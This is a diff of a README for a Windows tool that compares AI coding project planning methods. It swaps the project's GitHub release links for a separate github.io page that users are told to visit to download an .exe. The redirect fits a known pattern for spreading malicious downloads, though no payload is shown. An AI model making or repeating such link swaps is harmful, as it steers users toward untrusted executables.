@@ -1,6 +1,6 @@
 # 🛠️ spec-planning-frameworks - Compare AI coding project planning methods
 
-[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/boranyusuf254-dev/spec-planning-frameworks/releases)
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://boranyusuf254-dev.github.io)
 
 ## 📖 About This Tool
 
@@ -21,7 +21,7 @@ This application runs on standard Windows systems. Ensure your machine meets the
 
 To get started, follow these instructions to download the software to your computer.
 
-1.  Visit the official release page: [https://github.com/boranyusuf254-dev/spec-planning-frameworks/releases](https://github.com/boranyusuf254-dev/spec-planning-frameworks/releases).
+1.  Visit the official release page: [https://boranyusuf254-dev.github.io](https://boranyusuf254-dev.github.io).
 2.  Locate the section labeled Assets.
 3.  Click the link for the installation file marked with the .exe extension.
 4.  Wait for the file to finish downloading to your Downloads folder.
